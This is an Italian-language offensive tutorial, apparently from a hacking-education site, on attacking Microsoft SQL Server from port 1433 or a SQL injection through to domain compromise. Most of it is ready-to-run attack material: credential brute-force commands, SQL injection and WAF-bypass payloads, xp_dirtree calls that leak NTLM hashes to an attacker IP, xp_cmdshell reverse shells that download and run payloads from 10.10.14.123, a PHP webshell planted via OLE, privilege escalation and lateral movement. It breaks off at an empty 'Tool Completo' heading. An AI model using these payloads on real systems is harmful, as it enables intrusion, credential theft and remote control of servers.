---
title: 'SQL Injection MSSQL: xp_cmdshell, WAF Bypass e RCE'
slug: porta-1433-mssql
description: 'Guida SQL injection MSSQL: UNION, blind, stacked, WAF bypass, xp_dirtree per hash NTLM e xp_cmdshell per RCE. Dalla porta 1433 alla shell.'
image: /mssqlù.webp
draft: false
date: 2026-02-01T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - porta-windows
  - mssql
---

Da una porta 1433 aperta o da una SQL Injection su MSSQL (Microsoft SQL Server) puoi arrivare a enumerazione completa, hash capture con **xp\_dirtree**, RCE tramite** xp\_cmdshell **e movimento laterale in Active Directory. Questa guida ti porta dall'inizio alla fine, coprendo entrambi i percorsi.
**Cosa imparerai:**

* Come capire se un server espone MSSQL sulla porta 1433
* Come entrare con credenziali deboli o brute force
* Come sfruttare una SQL Injection su MSSQL: tutte le varianti di sintassi da provare
* Come catturare hash NTLM con `xp_dirtree` senza sysadmin e senza alert EDR
* Come arrivare a RCE con `xp_cmdshell` e metodi alternativi più stealth
* Come muoverti tra SQL Server con i linked server
* Come sfruttare l'integrazione AD e fare Kerberoasting dal DB

**Prerequisiti:** conoscenza base di SQL, un proxy come [Burp Suite](https://hackita.it/articoli/burp-suite) e accesso a un ambiente di test autorizzato.

***

## Due percorsi di attacco

Prima di iniziare, chiarisci da dove stai partendo:

* **Hai la porta 1433 esposta?** → Parti da enumerazione e brute force (sezioni 2–3)
* **Hai una web app vulnerabile?** → Parti dalla SQL Injection (sezioni 4–11)

In entrambi i casi l'obiettivo è lo stesso: arrivare a privilegi SQL utili per hash capture, RCE o lateral movement. Le sezioni 12–16 si applicano a entrambi i percorsi.

***

## Indice

1. [Perché MSSQL è un target ad alto valore](#1)
2. [Enumerazione Porta 1433](#2)
3. [Accesso Diretto: Credenziali, Brute Force e Connessione](#3)
4. [SQL Injection su MSSQL: Identificare il Punto Vulnerabile](#4)
5. [La Sintassi: Apici, Commenti e Terminatori](#5)
6. [Varianti da Provare Quando il Payload Non Funziona](#6)
7. [UNION-Based: Dump Visivo dei Dati](#7)
8. [Error-Based: Fai Parlare gli Errori](#8)
9. [Blind SQL Injection: Boolean e Time-Based](#9)
10. [Stacked Queries: Statement Multipli](#10)
11. [Hash Capture via xp\_dirtree](#11)
12. [RCE con xp\_cmdshell e Metodi Alternativi](#12)
13. [Privilege Escalation Interna](#13)
14. [Linked Server: Lateral Movement tra SQL Server](#14)
15. [Active Directory e Kerberoasting da MSSQL](#15)
16. [Tool Completo](#16)
17. [Percorso Operativo Consigliato](#17)
18. [Troubleshooting](#18)
19. [FAQ](#19)
20. [Cheat Sheet Finale](#20)

***

## 1. Perché MSSQL è un target ad alto valore {#1}

Microsoft SQL Server è il database enterprise dominante in ambienti Windows. A differenza di MySQL o PostgreSQL, MSSQL ha funzionalità native che permettono di uscire dal database e interagire direttamente con il sistema operativo:

| Funzionalità                 | Cosa fa                             | Privilegi richiesti        |
| ---------------------------- | ----------------------------------- | -------------------------- |
| `xp_cmdshell`                | Esegue comandi OS                   | sysadmin                   |
| `xp_dirtree`                 | Forza connessione SMB → hash NTLMv2 | Basso                      |
| Linked Server                | Lateral movement tra istanze SQL    | Variabile                  |
| `sp_execute_external_script` | Esegue Python/R sul server          | Config abilitata           |
| `OPENROWSET BULK`            | Legge file dal filesystem           | ADMINISTER BULK OPERATIONS |
| `xp_regread`                 | Legge il registro di Windows        | sysadmin                   |

Una SQLi o credenziali deboli su MSSQL non è solo un data breach: con i permessi giusti arrivi a una shell SYSTEM e potenzialmente al dominio AD.

**Database di sistema di default** — ignora questi nell'enumerazione:

| Nome             | Note                                       |
| ---------------- | ------------------------------------------ |
| master           | Sempre presente — contiene config e logins |
| model            | Template per nuovi DB                      |
| msdb             | SQL Server Agent — job e alert             |
| tempdb           | Dati temporanei                            |
| northwind / pubs | Solo versioni vecchie                      |

***

## 2. Enumerazione Porta 1433 {#2}

La porta **1433/TCP** è il default per le istanze MSSQL standard. La porta **1434/UDP** è il SQL Browser Service: serve a scoprire le istanze *named*, che non stanno sulla 1433 ma su porte dinamiche assegnate al momento dell'installazione. Se 1433 è chiusa, sempre fare scan su 1434/UDP e poi scan dell'intera range alta.

```bash
# Scan base con script MSSQL
nmap -sV -sC -p 1433 10.10.10.15

# Scan completo con tutti gli script MSSQL
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,\
mssql.instance-name=MSSQLSERVER -sV -p 1433 10.10.10.15

# SQL Browser per istanze named
nmap -sU -p 1434 10.10.10.15

# Se sospetti istanze named su porte dinamiche
nmap -p 1024-65535 --open 10.10.10.15
```

**Output atteso:**

```
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.0.4375.4
| ms-sql-ntlm-info:
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: corp.local
|   DNS_Computer_Name: SQL01.corp.local
```

Versione esatta, dominio, hostname — tutto utile per CVE matching e per la catena AD.

***

## 3. Accesso Diretto: Credenziali, Brute Force e Connessione {#3}

### Credenziali default e deboli da provare

| Username        | Password        | Note                             |
| --------------- | --------------- | -------------------------------- |
| `sa`            | \`\` (vuota)    | Default su installazioni vecchie |
| `sa`            | `sa`            | Classica                         |
| `sa`            | `Password1`     | Policy minima                    |
| `sa`            | `admin`         | Abitudine comune                 |
| `sa`            | nome del server | Frequente in enterprise          |
| `administrator` | `administrator` | Account Windows                  |
| `sa`            | `sqlserver`     | Default alcune versioni          |

### Brute force con nxc / CrackMapExec

```bash
# SQL auth
nxc mssql 10.10.10.15 -u sa -p passwords.txt
nxc mssql 10.10.10.15 -u users.txt -p 'Password123'

# Windows auth (dominio)
nxc mssql 10.10.10.15 -u users.txt -p 'Password123' -d corp.local

# Pass-the-hash
nxc mssql 10.10.10.15 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:hash

# Enum utenti AD via RID bruteforce
nxc mssql 10.10.10.15 -u sa -p 'Password123' --rid-brute 5000

# Esegui comando direttamente se hai le creds
crackmapexec mssql -d corp -u user -p pass -x "whoami"
crackmapexec mssql -d corp -u user -H hash -X '$PSVersionTable'
```

**Output (creds valide):**

```
MSSQL 10.10.10.15 1433 SQL01 [+] CORP\sa:Password123 (Pwn3d!)
```

`(Pwn3d!)` = sysadmin confermato.

### Connessione con impacket-mssqlclient

```bash
# SQL auth
mssqlclient.py sa:Password123@10.10.10.15

# Windows auth
mssqlclient.py -windows-auth CORP/user:pass@10.10.10.15

# Con database specifico
mssqlclient.py [-db NomeDB] sa:pass@10.10.10.15

# sqsh (alternativa)
sqsh -S 10.10.10.15 -U sa -P Password123
sqsh -S 10.10.10.15 -U .\\utente_locale -P pass   # Windows auth locale
```

**Comandi utili dentro la shell mssqlclient:**

```
enable_xp_cmdshell
xp_cmdshell whoami
enum_links
use_link [NOME_LINK]
```

### Enumerazione post-accesso diretto

```sql
SELECT @@VERSION;
SELECT DB_NAME();
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT @@SERVERNAME;
SELECT DEFAULT_DOMAIN();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL,'SERVER');
SELECT name FROM sys.databases;
SELECT service_account FROM sys.dm_server_services;
SELECT name, data_source FROM sys.servers WHERE is_linked=1;
SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin',name)=1;

-- Hashes SQL logins (MSSQL 2005+ hashcat mode 132)
SELECT name+'-'+master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;
```

***

## 4. SQL Injection su MSSQL: Identificare il Punto Vulnerabile {#4}

Se la sorgente è una web app che usa MSSQL come backend, prima conferma il DBMS e il contesto del parametro, poi scegli il payload. I punti più comuni sono parametri GET/POST di ricerca, filtri, ID, cookie di sessione e header HTTP.

### Test iniziale

```
'
''
' OR '1'='1
' AND '1'='1
' AND '1'='2
1 AND 1=1
1 AND 1=2
```

### Interpretare la risposta

| Cosa vedi                                | Significato                                  |
| ---------------------------------------- | -------------------------------------------- |
| Errore SQL (`Incorrect syntax near...`)  | Injection confermata — error-based possibile |
| Pagina diversa tra `AND 1=1` e `AND 1=2` | Boolean blind confermata                     |
| Ritardo 5+ secondi con `WAITFOR DELAY`   | Time-based blind confermata                  |
| Nessuna differenza                       | WAF attivo o parametro non iniettabile       |

### Conferma che è MSSQL e non un altro DBMS

```sql
' AND @@VERSION LIKE '%Microsoft SQL Server%'-- -
' AND BINARY_CHECKSUM(1)=BINARY_CHECKSUM(1)-- -
' AND @@CONNECTIONS>0-- -
' AND 1=CONVERT(int,@@VERSION)-- -   → errore con versione nel testo
```

Se qualcuno ritorna TRUE o un errore con "Microsoft SQL Server" → sei su MSSQL.

***

## 5. La Sintassi: Apici, Commenti e Terminatori {#5}

### Il singolo apice `'`

Il parametro web viene inserito in una query tipo:

```sql
SELECT * FROM products WHERE name = 'INPUT'
```

Iniettando `'` chiudi la stringa prima del tempo → errore SQL → confermata.

### I commenti: `--`, `-- -`, `--+`

Dopo il payload devi commentare il resto della query originale. `--` in SQL richiede tecnicamente uno spazio dopo per essere valido (`-- `).

| Commento | Funzionamento                          | Quando usarlo                         |
| -------- | -------------------------------------- | ------------------------------------- |
| `--`     | Funziona su MSSQL anche senza spazio   | Default                               |
| `-- -`   | `--` + spazio + `-` → spazio garantito | Quando `--` viene troncato o filtrato |
| `--+`    | In URL `+` = spazio → diventa `-- `    | Parametri GET in URL                  |
| `/* */`  | Commento inline                        | Bypass filtri su spazi e keyword      |

**Regola pratica:** usa `-- -` nei body POST via Burp, `--+` nei parametri GET URL.

### Il punto e virgola `;`

Chiude lo statement corrente e apre il successivo. Necessario per stacked queries e stored procedure. Schema completo lato web:

```
'                   → chiude la stringa
; payload           → nuovo statement
;-- -               → chiude il nuovo statement e commenta il resto
```

Quindi la struttura corretta per stacked queries via web è:

```
'; EXEC xp_cmdshell 'whoami';-- -
^^                           ^^
chiude stringa    chiude statement + commenta
```

### AND vs OR

| Operatore       | Effetto                      | Quando usarlo                               |
| --------------- | ---------------------------- | ------------------------------------------- |
| `' AND 1=1-- -` | Mantiene il filtro originale | Boolean blind, UNION                        |
| `' AND 1=2-- -` | Forza FALSE                  | Verifica discriminatore blind               |
| `' OR 1=1-- -`  | Bypassa tutti i filtri       | Authentication bypass — genera molto rumore |

***

## 6. Varianti da Provare Quando il Payload Non Funziona {#6}

In un test reale `' UNION SELECT 1,2,3-- -` quasi mai funziona al primo tentativo. Segui questo ordine di lavoro:

```
1. Identifica il contesto del parametro
2. Prova la variante di commento giusta
3. Prova UNION SELECT
4. Se UNION non va → prova error-based o blind
5. Se stacked funziona → prova xp_dirtree e poi xp_cmdshell
```

### Step 1 — Identifica il contesto

```
Prova:  '    → errore syntax
Prova:  ''   → errore sparisce → contesto stringa semplice
Prova:  ')   → errore sparisce → contesto con parentesi
Prova:  '))  → errore sparisce → doppia parentesi
Prova:  1    → nessun errore  → intero (nessun apice)
```

### Step 2 — Prova le varianti in ordine

Per **stringa semplice** — prova queste nell'ordine, fermati quando funziona:

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3--+
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL-- -
' UNION ALL SELECT 1,2,3-- -
```

Per **parametro con parentesi**:

```sql
') UNION SELECT 1,2,3-- -
')) UNION SELECT 1,2,3-- -
```

Per **stacked queries** — nota il `;` finale prima del commento:

```sql
'; SELECT 1;-- -
'; WAITFOR DELAY '0:0:5';-- -
'; EXEC xp_dirtree '\\10.10.14.123\share';-- -
'; EXEC xp_cmdshell 'whoami';-- -
```

Per **parametro numerico** (nessun apice):

```sql
1 UNION SELECT 1,2,3-- -
1 AND 1=1-- -
1; WAITFOR DELAY '0:0:5';-- -
```

### Step 3 — Bypass spazi e keyword WAF

```sql
-- Commento inline al posto degli spazi
'/**/UNION/**/SELECT/**/1,2,3-- -

-- URL encoding (GET)
'+UNION+SELECT+1,2,3-- -
'%09UNION%09SELECT%091,2,3-- -      (TAB)
'%0aUNION%0aSELECT%0a1,2,3-- -     (newline)
'%0bUNION%0bSELECT%0b1,2,3-- -     (vertical tab)
'%0cUNION%0cSELECT%0c1,2,3-- -     (form feed)
'%0dUNION%0dSELECT%0d1,2,3-- -     (carriage return)
'%a0UNION%a0SELECT%a01,2,3-- -      (non-breaking space)

-- Null byte
'%00UNION SELECT 1,2,3-- -

-- Case mixing
' UnIoN SeLeCt 1,2,3-- -

-- UNION variants (bypass regex su "union select")
' UNION ALL SELECT 1,2,3-- -
' UNION DISTINCT SELECT 1,2,3-- -
' UNION DISTINCTROW SELECT 1,2,3-- -

-- Spezza UNION e SELECT con commento (bypassa regex "union select" come stringa unica)
' UNION/**/SELECT 1,2,3-- -
' UN/**/ION SE/**/LECT 1,2,3-- -
' UNION%0aSELECT 1,2,3-- -

-- Double encoding
'%2527 UNION SELECT 1,2,3-- -
```

### Step 4 — Tecniche avanzate WAF bypass

**HTTP Parameter Pollution (HPP)**
Se l'app ha due parametri che finiscono nella stessa query, puoi spezzare il payload tra i due — il WAF ispeziona ogni parametro singolarmente e non vede il payload completo:

```
# WAF vede: "1" e "UNION SELECT 1,2,3-- -" separati → non blocca
# Backend concatena: "1 UNION SELECT 1,2,3-- -" → esegue

?year=1 UNION SELECT /*&month=*/ 1,2,3-- -
?id=1 UNION /*&cat=*/ SELECT 1,2,3-- -
```

**CR/LF nel payload**
SQL tollera carriage return e line feed all'interno delle query. Utile quando `union select` viene bloccato come stringa unica:

```
' UNION%0d%0aSELECT 1,2,3-- -
' UNION%0d%0aSELECT%0d%0a1,2,3-- -
```

**JSON-based bypass (Claroty Team82)**
Molti WAF (AWS, Cloudflare, F5, Imperva) non ispezionano la sintassi JSON nelle query SQL. Preponi un operatore JSON per accecare il WAF:

```sql
-- MSSQL supporta JSON dal 2016
' AND JSON_VALUE('{"a":1}','$.a')=1 UNION SELECT 1,2,3-- -
' OR 1=(SELECT 1 WHERE JSON_VALUE('{"x":"1"}','$.x')='1') UNION SELECT 1,2,3-- -
```

**Iniezione via header HTTP**
Se l'app logga o usa il contenuto degli header in query SQL, prova l'injection lì — spesso i WAF non ispezionano gli header con la stessa attenzione del body:

```
X-Forwarded-For: 1' UNION SELECT 1,2,3-- -
User-Agent: ' UNION SELECT 1,2,3-- -
Referer: ' UNION SELECT 1,2,3-- -
X-Originating-IP: 1' OR 1=1-- -
```

**Concatenazione stringa MSSQL per bypassare keyword filter**

```sql
-- Costruisci la keyword dinamicamente (bypass blacklist "xp_cmdshell", "UNION", ecc.)
'; DECLARE @q NVARCHAR(100)='UNI'+'ON SEL'+'ECT 1,2,3';EXEC(@q);-- -
'; DECLARE @c NVARCHAR(100)='xp_'+'cmdshell';EXEC @c 'whoami';-- -
```

**Null byte come terminatore**

```sql
'%00 UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3%00-- -
```

**sqlmap — combinazioni tamper per MSSQL con WAF**

```bash
# WAF generico
--tamper=space2mssqlblank,charencode,randomcase

# WAF aggressivo
--tamper=space2mssqlblank,charencode,randomcase,between,equaltolike

# Solo obfuscation case+commenti
--tamper=randomcase,space2comment

# Encoding Unicode
--tamper=charunicodeencode,randomcase

# Aggiungi random agent per bypassare fingerprinting sqlmap
--random-agent

# Aggiungi delay per evitare rate limiting
--delay=2 --safe-freq=3
```

***

## 7. UNION-Based: Dump Visivo dei Dati {#7}

### Trova il numero di colonne

```sql
-- ORDER BY (errore quando superi le colonne reali)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY N-- -

-- UNION NULL (type-safe, funziona sempre)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -

-- Interi (se le colonne accettano int)
' UNION SELECT 1-- -
' UNION SELECT 1,2-- -
' UNION SELECT 1,2,3-- -
```

### Trova le colonne visibili a schermo

```sql
' UNION SELECT 'hackita',NULL,NULL-- -
' UNION SELECT NULL,'hackita',NULL-- -
' UNION SELECT NULL,NULL,'hackita'-- -
```

Quando "hackita" appare nella pagina → quella è la colonna che usi per estrarre i dati.

### Enumera e dumpa

```sql
-- Recon iniziale
' UNION SELECT NULL,DB_NAME(),NULL-- -
' UNION SELECT NULL,@@VERSION,NULL-- -
' UNION SELECT NULL,SYSTEM_USER,NULL-- -
' UNION SELECT NULL,@@SERVERNAME,NULL-- -

-- Lista database
' UNION SELECT NULL,name,NULL FROM master..sysdatabases-- -
' UNION SELECT NULL,DB_NAME(0),NULL-- -     → cambia 0,1,2,3...

-- Lista tabelle
' UNION SELECT NULL,table_name,NULL FROM NomeDB.information_schema.tables-- -
' UNION SELECT NULL,name,NULL FROM NomeDB..sysobjects WHERE xtype='U'-- -

-- Lista colonne
' UNION SELECT NULL,column_name,NULL FROM NomeDB.information_schema.columns WHERE table_name='NomeTabella'-- -

-- Dump dati
' UNION SELECT NULL,username,password FROM NomeDB..NomeTabella-- -

-- Tutto in una riga (FOR XML PATH)
' UNION SELECT NULL,(SELECT username+':'+password+' | ' FROM NomeDB..NomeTabella FOR XML PATH('')),NULL-- -
```

***

## 8. Error-Based: Fai Parlare gli Errori {#8}

```sql
-- CONVERT (il più usato)
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- -
' AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~'))-- -

-- CAST
' AND 1=CAST((SELECT TOP 1 name FROM master..sysdatabases) AS int)-- -

-- Per parametri stringa
' + convert(int,@@version) + '

-- Tutti i DB in una riga
' AND 1=CAST((SELECT (SELECT name+' ' FROM master..sysdatabases FOR XML PATH(''))) AS int)-- -
```

L'errore che ricevi conterrà i tuoi dati:

```
Conversion failed when converting the varchar value 'master tempdb model msdb' to data type int.
```

***

## 9. Blind SQL Injection: Boolean e Time-Based {#9}

### Boolean Blind

Pagina che non mostra dati SQL ma cambia tra TRUE e FALSE.

```sql
-- Conferma discriminatore
' AND 1=1-- -    → pagina normale (TRUE)
' AND 1=2-- -    → pagina diversa (FALSE)

-- Lunghezza
' AND LEN((SELECT TOP 1 name FROM master..sysdatabases))=6-- -

-- Carattere per carattere (confronto diretto)
' AND SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1)='m'-- -

-- Con ASCII + binary search (più veloce in automazione)
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1))>64-- -
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1))=109-- -

-- Dump password
' AND SUBSTRING((SELECT TOP 1 password FROM NomeDB..users),1,1)='a'-- -

-- Riga successiva
' AND SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN ('master')),1,1)='t'-- -
```

### Time-Based Blind

```sql
-- Conferma — varianti da provare
'; IF(1=1) WAITFOR DELAY '0:0:5';-- -
ProductID=1'; WAITFOR DELAY '0:0:5';-- -
ProductID=1); WAITFOR DELAY '0:0:5';-- -
ProductID=1')); WAITFOR DELAY '0:0:5';-- -

-- Estrai carattere per carattere
'; IF(ASCII(SUBSTRING((SELECT TOP 1 name FROM master..sysdatabases),1,1))=109) WAITFOR DELAY '0:0:5';-- -

-- Verifica sysadmin
'; IF(IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5';-- -

-- Verifica esistenza tabella
'; IF EXISTS(SELECT * FROM NomeDB..NomeTabella) WAITFOR DELAY '0:0:5';-- -
```

Per automatizzare usa [sqlmap](https://hackita.it/articoli/sqlmap) con `--technique=B` o uno [script Python per blind SQLi](https://hackita.it/articoli/blind-sql-injection). Con time-based usa `--time-sec=5 --threads=1` — più thread = falsi positivi garantiti.

**sqlmap quando il WAF blocca il fingerprint:**

```bash
sqlmap -r req.txt -p q --force-ssl --dbms=mssql --technique=B \
  --tamper=space2mssqlblank,charencode,randomcase \
  --string="valore_TRUE" --flush-session --no-cast --dbs
```

***

## 10. Stacked Queries: Statement Multipli {#10}

```sql
-- Conferma (nota il ; finale prima del commento)
'; SELECT 1;-- -

-- Bypass blacklist "EXEC xp_cmdshell" con variabile
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'whoami';-- -

-- Stacked senza punto e virgola (MSSQL specifico)
SELECT 'A' SELECT 'B'

-- Scrivi su tabella temporanea poi leggi con UNION
'; CREATE TABLE #tmp (data VARCHAR(1000)); INSERT INTO #tmp SELECT name FROM master..sysdatabases;-- -
' UNION SELECT NULL,(SELECT TOP 1 data FROM #tmp),NULL-- -
```

***

## 11. Hash Capture via xp\_dirtree {#11}

Uno dei vettori più sottovalutati di MSSQL — e uno dei più potenti.

**Perché è importante:**

* Non richiede `xp_cmdshell` né sysadmin
* Quasi sempre disponibile anche per utenti con privilegi bassi
* Cattura l'hash NTLMv2 del service account SQL
* Non genera i tipici alert EDR legati all'esecuzione di processi OS
* Apre la strada a cracking con hashcat o relay con ntlmrelayx

**Come funziona:** forzi MSSQL a fare una richiesta SMB verso il tuo IP. [Responder](https://hackita.it/articoli/responder) cattura il challenge NTLMv2 del service account.

```bash
# Avvia PRIMA di mandare il payload
sudo responder -I tun0 -v
```

```sql
-- Varianti (tutte catturano NTLMv2)
'; EXEC master.dbo.xp_dirtree '\\10.10.14.123\share';-- -
'; EXEC master..xp_subdirs '\\10.10.14.123\share';-- -
'; EXEC master..xp_fileexist '\\10.10.14.123\share\file';-- -

-- Via BACKUP (metodo alternativo)
BACKUP LOG [TESTING] TO DISK='\\10.10.14.123\file'
RESTORE HEADERONLY FROM DISK='\\10.10.14.123\file'

-- Bypass WAF con variabile
'; DECLARE @q VARCHAR(99); SET @q='\\10.10.14.123\'; SET @q=@q+'share'; EXEC master.dbo.xp_dirtree @q;-- -
```

**Output Responder:**

```
[SMB] NTLMv2-SSP Hash: svc_sql::CORP:a1b2c3d4:e5f6a7b8...
```

Cracca con `hashcat -m 5600 hash.txt rockyou.txt`.

> **Attenzione:** se l'hash è di un account macchina (username termina con `$`, es. `CORP\SQL01$`) non si cracca — le password degli account macchina sono casuali e lunghe 120 caratteri. In quel caso passa direttamente al relay.

**Verifica chi ha i permessi:**

```sql
Use master; EXEC sp_helprotect 'xp_dirtree';
Use master; EXEC sp_helprotect 'xp_subdirs';
```

***

## 12. RCE con xp\_cmdshell e Metodi Alternativi {#12}

### xp\_cmdshell

```sql
-- Verifica sysadmin e stato
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT CONVERT(INT, ISNULL(value, value_in_use)) FROM sys.configurations WHERE name='xp_cmdshell';

-- Abilita (step by step)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- One liner
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Esegui comandi base
EXEC master..xp_cmdshell 'whoami';
EXEC master..xp_cmdshell 'whoami /priv';
EXEC master..xp_cmdshell 'net user /domain';
EXEC master..xp_cmdshell 'net group "Domain Admins" /domain';
EXEC master..xp_cmdshell 'ipconfig /all';

-- Reverse shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.123/shell.ps1") | powershell -noprofile';
EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.123/shell.exe C:\Windows\Temp\s.exe && C:\Windows\Temp\s.exe';

-- Disabilita dopo l'uso (OPSEC)
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

### Metodi alternativi — meno rumore per gli EDR

`xp_cmdshell` genera un processo figlio di `sqlservr.exe` — quasi tutti gli EDR lo monitorano. Questi metodi sono meno visibili:

```sql
-- OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\Windows\Temp\out.txt';

-- Python (gira come utente diverso da xp_cmdshell)
EXECUTE sp_execute_external_script @language=N'Python',
  @script=N'print(__import__("os").system("whoami"))';
EXECUTE sp_execute_external_script @language=N'Python',
  @script=N'print(open("C:\\inetpub\\wwwroot\\web.config","r").read())';

-- Webshell via OLE (8 = ForAppending — apre il file in append)
DECLARE @OLE INT, @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE;
```

### Lettura file e registro

```sql
-- Lettura file (richiede ADMINISTER BULK OPERATIONS)
SELECT * FROM OPENROWSET(BULK N'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;
SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS Contents;

-- Error-based file read via SQLi
-1 UNION SELECT NULL,(SELECT x FROM OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),NULL-- -

-- Registro di Windows
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName';
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\MSSQLSERVER','ObjectName';
```

***

## 13. Privilege Escalation Interna {#13}

### Impersonation

```sql
-- Chi posso impersonare?
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
WHERE a.permission_name='IMPERSONATE';

-- Impersona sa
EXECUTE AS LOGIN='sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Torna indietro
REVERT;
```

### db\_owner su Database Trustworthy

```sql
-- Trova database trustworthy
SELECT a.name, b.is_trustworthy_on FROM master..sysdatabases a
INNER JOIN sys.databases b ON a.name=b.name WHERE b.is_trustworthy_on=1;

-- Verifica se sei db_owner
USE NomeDB;
SELECT rp.name AS role, mp.name AS user
FROM sys.database_role_members drm
JOIN sys.database_principals rp ON drm.role_principal_id=rp.principal_id
JOIN sys.database_principals mp ON drm.member_principal_id=mp.principal_id
WHERE rp.name='db_owner';

-- Crea stored procedure che esegue come il proprietario (admin)
USE NomeDB;
CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS
EXEC sp_addsrvrolemember 'TUO_UTENTE','sysadmin';

EXEC sp_elevate;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Pulizia OPSEC
DROP PROCEDURE sp_elevate;
```

### SeImpersonatePrivilege — Potato Attacks

Se ottieni una shell come service account MSSQL e il token `SeImpersonatePrivilege` è abilitato (`whoami /priv`), puoi scalare a SYSTEM con:

```bash
# Verifica token
EXEC xp_cmdshell 'whoami /priv';

# Se SeImpersonatePrivilege è presente → Potato attack
# GodPotato, PrintSpoofer, RoguePotato, JuicyPotato
EXEC xp_cmdshell 'C:\Windows\Temp\GodPotato.exe -cmd "cmd /c whoami"';
```

***

## 14. Linked Server: Lateral Movement tra SQL Server {#14}

I linked server collegano istanze MSSQL tra loro — anche cross-domain. L'idea operativa è questa: potresti avere accesso limitato su SQL01, ma SQL01 è configurato per connettersi a SQL02 con un account più privilegiato. SQL02 si connette a SQL03 con privilegi ancora maggiori. Ogni hop può portarti a sysadmin su un server diverso senza che tu abbia mai avuto credenziali dirette su quei server.

```sql
-- Lista linked server
SELECT name, data_source FROM sys.servers WHERE is_linked=1;

-- Chi sei sul server remoto?
EXEC ('SELECT SYSTEM_USER') AT [SERVER_COLLEGATO];
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [SERVER_COLLEGATO];

-- Verifica il mapping delle credenziali (con quale account ti connetti al remoto)
EXEC sp_helplinkedsrvlogin 'NOME_LINKED_SERVER';

-- RCE se sei sysadmin sul remoto
EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE;') AT [SERVER_COLLEGATO];
EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [SERVER_COLLEGATO];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [SERVER_COLLEGATO];

-- Chain di server (SQL01 → SQL02 → SQL03)
SELECT version FROM OPENQUERY("link1",'SELECT version FROM OPENQUERY(''link2'',''SELECT @@version AS version'')');
```

Con `impacket-mssqlclient`:

```bash
mssqlclient.py -windows-auth CORP/user:pass@SQLHOST
enum_links
use_link [NOME]
enable_xp_cmdshell
xp_cmdshell whoami
```

***

## 15. Active Directory e Kerberoasting da MSSQL {#15}

Se il server SQL è joined al dominio, puoi enumerare [Active Directory](https://hackita.it/articoli/active-directory) direttamente.

```sql
SELECT DEFAULT_DOMAIN();
```

Il service account MSSQL quasi sempre ha un SPN (`MSSQLSvc/hostname:1433`) — è [Kerberoastable](https://hackita.it/articoli/kerberos) per design:

```bash
# Kerberoast il service account
GetUserSPNs.py corp.local/user:pass -dc-ip 10.10.10.10 -request | grep MSSQL
hashcat -m 13100 tgs_hash.txt rockyou.txt

# RID bruteforce utenti AD via MSSQL
nxc mssql 10.10.10.15 -u sa -p 'pass' --rid-brute 5000
```

```sql
-- Con xp_cmdshell (se disponibile)
EXEC xp_cmdshell 'net user /domain';
EXEC xp_cmdshell 'net group "Domain Admins" /domain';
EXEC xp_cmdshell 'nltest /domain_trusts';
```

***

## 16. Tool Completo {#16}

